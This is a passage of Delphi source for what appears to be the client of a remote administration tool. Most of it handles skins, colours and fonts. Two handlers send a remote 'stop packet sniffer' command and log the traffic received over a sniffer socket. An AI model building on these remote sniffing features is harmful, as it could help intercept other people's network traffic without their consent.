 ListBox2.Items.Delete(ListBox2.ItemIndex);
end;

procedure TMainForm.OutlookBtn141Click(Sender: TObject);
begin
 SendCommand('SPS','stopping packet sniffer...','2.1');
end;

procedure TMainForm.OutlookBtn145Click(Sender: TObject);
begin
 Anim.Animeaza(SniffLog);
end;

procedure TMainForm.SniffSockError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
//
end;

procedure TMainForm.SniffSockRead(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 SniffLog.Memo1.Lines.Add(Socket.ReceiveText);
end;

procedure TMainForm.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TMainForm.OutlookBtn148Click(Sender: TObject);
begin
 if not BrowseFolder.Execute then exit;
 if not LoadSkin(BrowseFolder.RootPath) then ShowMsg('error loading skin.')
 else begin
  SetTheColors;SaveColors;
  WriteKey('skin',BrowseFolder.RootPath);
 end;
end;

procedure TMainForm.OutlookBtn147Click(Sender: TObject);
begin
 if not LoadSkin('default') then ShowMsg('error loading skin.');
 SetDefaultColors;
 SetTheColors;SaveColors;
 WriteKey('skin','default');
end;

procedure TMainForm.OutlookBtn149Click(Sender: TObject);
begin
 _Pagini.ActivePage:=pColorz;
end;

procedure TMainForm.OutlookBtn2Click(Sender: TObject);
begin
if ButtonFontAttr<>'' then
 begin
  if MainForm.ButtonFontAttr[1]='1' then FontDialog1.Font.Style := FontDialog1.Font.Style+[fsBold];
  if MainForm.ButtonFontAttr[2]='1' then FontDialog1.Font.Style := FontDialog1.Font.Style+[fsItalic];
  if MainForm.ButtonFontAttr[3]='1' then FontDialog1.Font.Style := FontDialog1.Font.Style+[fsUnderline];
  if MainForm.ButtonFontAttr[4]='1' then FontDialog1.Font.Style := FontDialog1.Font.Style+[fsStrikeout];
 end;
 if ButtonFontName<>'' then
  FontDialog1.Font.Name:=ButtonFontName else ButtonFontName:=OutlookBtn2.Font.Name;
 if ButtonFontSize<>0 then FontDialog1.Font.Size:=ButtonFontSize
  else FontDialog1.Font.Size:=OutlookBtn2.Font.Size;
 FontDialog1.Font.Color:=cButtonText;
 if FontDialog1.Execute then
  begin
   ButtonFontSize:=FontDialog1.Font.Size;
   cButtonText:=FontDialog1.Font.Color;
   ButtonFontName:=FontDialog1.Font.Name;
   ButtonFontAttr:='0000';
   if fsBold in FontDialog1.Font.Style then ButtonFontAttr[1]:='1';
   if fsItalic in FontDialog1.Font.Style then ButtonFontAttr[2]:='1';
   if fsUnderline in FontDialog1.Font.Style then ButtonFontAttr[3]:='1';
   if fsStrikeout in FontDialog1.Font.Style then ButtonFontAttr[4]:='1';
  end;
end;

procedure TMainForm.OutlookBtn3Click(Sender: TObject);
var ini:TIniFile;
    skin:string;
begin
{ BackgroundColor:=StringToColor(ini.ReadString('skin info', 'BackgroundColor', 'clBlack'));
 cButtonText:=StringToColor(ini.ReadString('skin info', 'ButtonFontColor', 'clWhite'));
 ButtonFontName:=ini.ReadString('skin info', 'ButtonFontName', '');
 ButtonFontSize:=ini.ReadInteger('skin info', 'ButtonFontSize', 0);
 ButtonFontAttr:=ini.ReadString('skin info', 'ButtonFontAttr', '0000');}
 if ReadKey('skin')='default' then
  begin
   WriteKey('skin_background',ColorToString(cFormBackground));
   WriteKey('skin_fontname',OutlookBtn2.Font.Name);
   WriteKey('skin_fontcolor',ColorToString(cButtonText));
   WriteKey('skin_fontattr',ButtonFontAttr);
   WriteKey('skin_fontsize',IntToStr(OutlookBtn2.Font.Size));
  end else
  begin
   skin:=readkey('skin');
   if skin[length(skin)]<>'\' then skin:=skin+'\';
   ini:=TIniFile.Create(skin+'skin.ini');
   ini.WriteString('skin info','BackgroundColor',ColorToString(Label112.Color));
   ini.WriteString('skin info','ButtonFontColor',ColorToString(Label113.Color));
   ini.WriteString('skin info','ButtonFontName',ButtonFontName);
   ini.WriteString('skin info','ButtonFontAttr',ButtonFontAttr);
   ini.WriteString('skin info','ButtonFontSize',IntToStr(ButtonFontSize));
   ini.WriteString('skin info','WindowLineColor',ColorToString(cFormLine));
   ini.WriteString('skin info','WindowTextColor',ColorToString(cFormText));
   ini.WriteString('skin info','WindowForegroundColor',ColorToString(cFormForeground));
   SkinDescription:=FlatEdit43.Text;
   ini.WriteString('skin info','SkinDescription',SkinDescription);
   ini.WriteString('menu info','MenuBackground',ColorToString(cMenuBackground));
   ini.WriteString('menu info','MenuPageText',ColorToString(cMenuPageNormalText));
   ini.WriteString('menu info','MenuPageBorder',ColorToString(cMenuPageNormalBorder));
   ini.WriteString('menu info','MenuPageBorderSelected',ColorToString(cMenuPageSelectedBorder));
   ini.WriteString('menu info','MenuItemColor',ColorToString(cMenuItemNormalText));
   ini.WriteString('menu info','MenuItemSelected',ColorToString(cMenuItemNormalBorder));
   ini.WriteString('menu info','MenuItemOutline',ColorToString(cMenuItemSelectedText));
   ini.WriteString('menu info','MenuArrows',ColorToString(cMenuArrows));
   ini.free;
  end;
 _Pagini.ActivePage:=pSkins;
end;

procedure TMainForm.pColorzEnter(Sender: TObject);
begin
 FlatEdit43.Text:=SkinDescription;
 Label112.Color:=cFormBackground;
 Label113.Color:=cButtonText;
end;

procedure TMainForm.Label112Click(Sender: TObject);
begin
 with Label112 do begin
  PickColor.Color:=Color;
  if PickColor.Execute then
  begin
   Color:=PickColor.Color;
   cFormBackground:=Color;
   SetTheColors;SaveColors;
  end;
 end;
end;

procedure TMainForm.Label113Click(Sender: TObject);
begin
 with Label113 do begin
  PickColor.Color:=Color;
  if PickColor.Execute then
  begin
   Color:=PickColor.Color;
   cButtonText:=Color;
   SetTheColors;SaveColors;
  end;
 end;
end;

procedure TMainForm.OutlookBtn150Click(Sender: TObject);
begin
 ButtonFontAttr:='0000';
 ButtonFontName:='';
 ButtonFontSize:=0;
end;

procedure TMainForm.OutlookBtn4Click(Sender: TObject);
begin
 _Pagini.ActivePage:=pSkins;
end;

procedure TMainForm.pSkinsShow(Sender: TObject);
var SearchRec:TSearchRec;
    name:string;
    bmp:TBitmap;
    ini:TIniFile;
    a:string;
begin
 ListBox3.Items.Clear;
 if FindFirst(SkinFolder+'*.*',faAnyFile,SearchRec)=0 then
  repeat
     name:=SearchRec.Name;
    if (((SearchRec.Attr and faDirectory)<>0) and (name<>'.') and (name<>'..'))then
    begin
     a:=name;
     if FileExists(SkinFolder+name+'\skin.ini') then
      begin
       ini:=TIniFile.Create(SkinFolder+name+'\skin.ini');
       a:=a+' ['+ini.ReadString('skin info','SkinDescription','')+']';
       ini.free;
      end;
      ListBox3.Items.Add(a);
    end;
  until FindNext(SearchRec)>0;
end;

procedure TMainForm.OutlookBtn146Click(Sender: TObject);
var skin:string;
begin
 if ListBox3.SelCount=0 then exit;
 skin:=ListBox3.Items[ListBox3.ItemIndex];
 if Pos(' [',skin)>0 then skin:=copy(skin,1,pos(' [',skin)-1);
 skin:=SkinFolder+skin;
 if LoadSkin(skin) then WriteKey('skin',skin);
//etDefaultColors;
 SetTheColors;SaveColors;
end;

function DeleteFolder(DirName: string):boolean;
var Error: Integer;
    FileSearch: TSearchRec;
begin
Result:=True;
try
 if DirName[Length(DirName)] <> '\' then DirName := DirName + '\';
 Error := FindFirst(DirName + '*.*', faAnyFile, FileSearch);
 try
  with FileSearch do
   while (Error = 0) do
   begin
    if (DirName + Name <> '.') and (DirName + Name <> '..') then SysUtils.DeleteFile(DirName + Name);
    Error := FindNext(FileSearch);
   end;
  finally
   FindClose(FileSearch);
  end;
 RemoveDir(DirName);
except Result:=False;end;
end;

procedure TMainForm.OutlookBtn91Click(Sender: TObject);
var skin:string;
begin
 if ListBox3.SelCount=0 then exit;
 skin:=ListBox3.Items[ListBox3.ItemIndex];
 if not AreYouSure('delete '+skin) then exit;
 if Pos(' [',skin)>0 then skin:=copy(skin,1,pos(' [',skin)-1);
 skin:=SkinFolder+skin;
 DeleteFolder(skin);
 pSkinsShow(self);
end;

end.


